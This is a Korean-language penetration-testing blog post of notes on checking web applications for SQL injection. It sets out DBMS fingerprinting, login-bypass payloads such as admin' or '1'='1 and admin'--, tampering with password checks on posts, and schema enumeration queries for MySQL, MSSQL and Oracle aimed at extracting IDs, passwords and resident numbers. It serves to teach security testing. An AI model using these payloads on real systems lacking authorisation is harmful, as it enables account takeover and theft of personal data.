---
title: "SQL Injection 취약점 점검"
date: 2023-07-20
# weight: 1
# aliases: ["/Pentest"]
tags: ["Web Security", "Penetration Testing", "SQL Injection"]
author: "CrackerNote"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
disableHLJS: false # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: true
ShowReadingTime: false
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: false
ShowRssButtonInSectionTermList: true
UseHugoToc: false
searchHidden: true
typora-root-url: ../
---

## 1️⃣ SQL Injection 취약점 점검



#### 📜**SQL Injection**

- 1) 에러 유/무 확인
  2) 취약점 유/무 확인
       검색란의 경우, 연결연산자 사용
        a. ' ' 로 사용하여 정상작동 한다면 (te' 'st), Mysql
        b. '+' 로 사용하여 정상작동 한다면 (te'+'st), Mssql
        c. '||' 로 사용하여 정상작동 한다면 (te'||'st), Oracle
  3) 조건 구문 완성



#### 📜**방법론**

- **1) 검색기능에 대한 취약점 점검**

   a. select * from board where title like '% '||(case when 1=1 then 'test' else 'aaaa' end)||' %'

    \> 결과 : '%'||'test'||'%' > '%test%'
    \> 1=2일때 > '%aaaa%'


   b. select * from board where 1=1 and title like '%test%' => TRUE
     select * from board where 1=2 and title like '%test%' => TRUE


    \> 컬럼이름이나 테이블의 이름의 경우는 Prepared를 사용하지 못하고, 직접 로직을 만들어 필터링을 해줘야함
      따라서 검색 부분의 타이틀, 작성자 등 분류해서 검색하는 기능이 있다면 가능성이 있음

   







   c. select * from board where (case when 1=1 then 'test' else 'aaa' end) like '%test%' 


    \> 버프에서 입력시 (case+when+1=1+then+'test'+else+'aaa'+end) 공백을 넣어줘야함

   







  **2) Prepared Statement 환경에서의 테이블 파라미터에 대한 취약점 점검 (JAVA Web 환경)**

   

   a. 127.0.0.1:8080/security/example.jsp?tbname=ex_member 가 있을 경우, 두가지가 존재함

   

    \> select * from tbname
    
     \- 127.0.0.1:8080/security/example.jsp?tbname=all_tables로 바꿔서 보낼 경우, 

  ​    Table Name이 뜨면 100% from 절에 있는 것임. 또한 Oracle 사용중 임을 알 수 있다.

   

    \> select * from board where tbname = '~~' 
     \- prepared statement 는 table name에 적용될 수 없다 . 따라서 select * from ex_member where id = ?

  ​    이런식으로 table name이 아니라 id와 같은 컬럼명에 적용시켜야 함. 
     \- 이럴경우 select * from ex_member (where 1=1 and id = ? --) where id = ? 와 같이 table name에 대하여 sql       injection을 수행 할 수 있음

   

    \> 다른 방법도 있음 (더 쉬움)
     \- select * from ex_member where id = ?
     \- select * from (select * from ex_member where 1=1 또는 1=2) ex_member where id = ? sub 쿼리를 통하여

  ​    한번 더 실행 되도록 하면 값이 같아진다. 

   

  **3) 인증우회 공격**

   a. ID를 알경우 - in-line query, Terminating query

    \> in-line query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (admin' or '1'='1) ' and pw='{$pw}'"

  






    \> Terminating query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (admin' -- ) ' and pw='{$pw}'"
     \- "select * from member where id=' (admin'#) ' and pw='{$pw}'"

   **mysql 주석문자: --, #
   ** --의 경우 [공백]--[공백] 이어야 함

   b. ID를 모를경우 - in-line query, Terminating query

    \> in-line query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (test' or 1=1 or '1'='1) ' and pw='{$pw}'"
    
    \> Terminating query
     \- "select * from member where id='{$id}' and pw='{$pw}'"
     \- "select * from member where id=' (test' or '1'='1' -- ) ' and pw='{$pw}'"
     \- "select * from member where id=' (test' or '1'='1'#) ' and pw='{$pw}'"

   c. 비밀글 비밀번호 부분 

    \> select * from board where idx=6 and pw='{$pw}'
      select * from board where idx=6 and pw=' (' or '1'='1) ' 
     \- 모든 결과가 참이 되므로... table 안에 첫번째 게시글이 나오게됨
    
    \> select * from board where idx=6 and pw=' (' or idx=8 -- ) '
     \- 해쉬화를 시켜 저장할 경우
        \1. application 단에서 해시화
         \> 싱글 쿼터(')로 판별 가능 > 입력시 오류 없음 > 싱글쿼터도 포함하여 md5 변환되어 서버로 전송

  ​       \> sql injection 불가
  ​      \2. DBMS 단에서 해시화
  ​       \> 싱글 쿼터(')로 판별 가능 > 입력 시 오류. (ex. md5() <- 괄호 안에 ' 들어가면 오류 생김) > sql injection가능

   d. 게시글 수정

   

    \> update 구문에 Password 검증 쿼리 예측
    
     \- UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password={$pw}
      UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password=' (' or '1'='1) '

  ​    (전체 구문에 영향을 미칠 수 있음..) 
  ​    UPDATE board SET title=..., content=..., data=... WHERE idx=7 and password='' (or idx=7 -- ) '

  ​    (따라서 idx 를 지정해주는 쿼리를 작성 하자)

   

    \> update 구문전 password 검증
     \- select * from board where idx=7 and password='' 후에 수정 페이지 들어간 후 수정

  







   e. 게시글 삭제

    \> delete 구문에 password 검증 쿼리 예측
     \- delete from where idx=7 and password=''

  







  **4) 데이터 조회 기법**

   a. DBMS 파악
    

    \> 에러를 통한 파악
    \> 연결 연산자를 통한 파악 (대부분 연결 연산자로 많이 됨) : **Oracle(||), MSSQL(+(%2b로 사용)), MySQL(공백)**
     \- (MSSQL)
       ?idx=192 and 'test'='te'+'st' (MSSQL) (burp 에서는 > ?idx=192+and+'test'='te'%2b'st' )
     \- (ORCLE)
       검색어에 > t'||(case when 1=1 then 'e' else 'a' end)||'st
    \> 함수를 통한 파악
     \- MySQL - now(), mid() > (?idx=7 and mid('test',1,1)='t') > **mid 함수의 경우 mysql 만 있음**
     \- MSSQL - len(), substring() > **len() 함수의 경우 mssql 만 있음**
     \- ORACLE - substr()
    \> 더미 테이블을 통한 파악
     \- ORACLE - select 1 from dual > (?idx=(select 192 from dual))로 조회시 192번 글이 조회 되었다면... 가능성 높음
     \- DB2 - select 1 from sysibm.sysdummy1

  ** JSP, JAVA 사용 시, ORACLE
  ** PHP 사용시, Mysql 사용 가능성 높음

   b. 공격 적합성 검토
    

    \> DBMS 에러 출력 유/무 파악 = error base
    \> DB 데이터 웹페이지 출력 유/무 파악(검색기능에 적합) = union base 
     \> t4 로 검색했는데 test4가 검색될 경우
    \> 위 둘다 안되면 .... Blind

   







   c. MySQL 데이터 조회

   

    \> 1. 순차적 접근(DB목록화, Table 목록화, 컬럼 목록화),

   







  ​     \* DB 목록화 :

  ​      select * from information.schema.schemata

  ​      select schema_name from information.schema.schemata
  ​      **(information_schema DB 안에 schemata 테이블에 있는 컬럼 "SCHEMA_NAME"은 DB 이름이다.)
  ​      (information_schema DB안에 tables, columns 안에 있는 컬럼 "table_schema"는 DB 이름이다.)**

   

  ​     \* Table 목록화 :

  ​      select table_name from information_schema.tables where table_schema='board'

   

  ​     \* Column 목록화 :

  ​      select * from information_schema.columns where table_shema='board' and table_name='members';

   

  ​     \* 데이터 조회 :

  ​      select idx, id, password, jumin from board.members;

   

     \> 2. 비순차적접근 (목적에 따라 접근하는 정보부터...)

   







  ​     \* 원하는 테이블 이름 출력 :

  ​      select table_name from information_schema.tables where table_schema='board'

  ​      and table_name like '%mem%';

  ​      -> 원하는 테이블 이름 출력 후, 순차적으로 Column 목록화, 데이터 조회 실행

  ​     

  ​     \* 원하는 컬럼 관련 출력(id 등..) :

  ​      select table_name, column_name from information_schema.columns where table_schema='board' and 
  ​      column_name like '%id%';

   

   d. MSSQL 데이터 조회

   

    \> 1. 순차적 접근 

   







  ​     \* 순차적 레코드 출력 : (top은 테이블의 레코드를 조회할때 결과중 상위 몇개만 표기하기 위해 사용하는 구문)

  ​      select top 3 name from sysdatabases; >> 3개의 결과값이 나옴

  ​      

  ​     (ORDER BY 사용)
  ​      select top 1 name from (select **top 1** name from sysdatabases order by name)**a** order by name desc; 

  ​      \> 첫번째 레코드 출력   **상위 top절은 무조건 1**                   **별칭 필수**

  ​      select top 1 name from (select top 2 name from sysdatabases order by name)a order by name desc;
  ​      \> 두번째 레코드 출력      

  ​      select top 1 name from (select top 3 name from sysdatabases order by name)a order by name desc; 
  ​      \> 세번째 레코드 출력

   

  ​     (NOT IN 사용)

  ​      select top 1 name from sysdatabases; >> master라는 레코드 하나 출력

  ​      select top 1 name from sysdatabases where name not in ('master'); >> master라는 레코드 제외 후 상위 출력

  ​      select top 1 name from sysdatabases where name not in ('master', 'tempdb');

  ​      ** 레코드가 너무 많을때는 계속 추가되야 하므로 길어짐 >> 따라서 NOT IN 연산자 안에 서브쿼리 사용 가능

  ​      select top 1 name from sysdatabases where name not in (select top **0** name from sysdatabases);

  ​      \> 첫번째 레코드 출력                       **서브쿼리 top 절은 0부터 시작**

  ​      select top 1 name from sysdatabases where name not in (select top 1 name from sysdatabases);

  ​      \> 첫번째 레코드 제외하고 제일 상위에 있는 레코드 출력

  ​      select top 1 name from sysdatabases where name not in (select top 2 name from sysdatabases);

  ​      \> 첫번째, 두번째 레코드 제외하고 제일 상위에 있는 레코드 출력     

   

  ​     (ROW_NUMBER() 사용) >> 2005 이상부터 사용가능!! 

  ​      ** row_number() >> 레코드별로 순차적으로 카운팅 해줌

  ​      select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a

  ​      where a.num=1; >> 첫번째 레코드 출력

  ​      select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a

  ​      where a.num=1; >> 두번째 레코드 출력

  

  **5) DBMS별 데이터 사전** 

   

   a. MYSQL**
  **

    \> Information_schema.schemata / Information_schema.tables / Information_schema.columns

   







   b. MSSQL

    \> sysdatabases(Master DB에 존재) / sysobjects (각 사용 DB에 존재) / syscolumns (각 사용 DB에 존재)
    
    \> (MSSQL 2005 이상) : sys.databases / sys.objects / sys.columns
    
    \> Information_schema.schemata / Information_schema.tables / Information_schema.columns

   







   c. ORACLE

    \> all_tables / all_tab_columns

   







  **6) DBMS별 메타데이터 목록화**

   

    a. MYSQL
    
     \> 순차적 접근 :

   







  ```
  #DB 목록화
  select * from information_schema.SCHEMATA;
  select schema_name from information_schema.SCHEMATA; # DB 목록화, schema_name : DB명
  
  #TABLE 목록화
  select * from information_schema.tables where table_schema="board"; # table_schema : DB 명
  select table_name from information_schema.tables where table_schema="board"; # table_schema : DB 명
  
  #COLUMN 목록화
  select * from information_schema.columns;
  select * from information_schema.COLUMNS where table_schema="board" and table_name="members"; # table_schema : DB 명
  
  #DATA 조회
  select id, idx, password from board.members;
  ```

   

    \> 비순차적 접근 : 테이블, 컬럼 등을 목적에 맞는 것부터 조회 시도
                **테이블 : mem, user, file, session, employee, admin ..

  ​              **컬럼 : id, pw, pass, jumin, ssn, admin, card ..

   

  ```
  #TABLE 목록화
  select table_name from information_schema.tables where table_schema="board" and table_name like '%mem%';
  
  #COLUMN 목록화
  select table_name, column_name from information_schema.COLUMNS where table_schema="board" and column_name like '%id%';
  ```
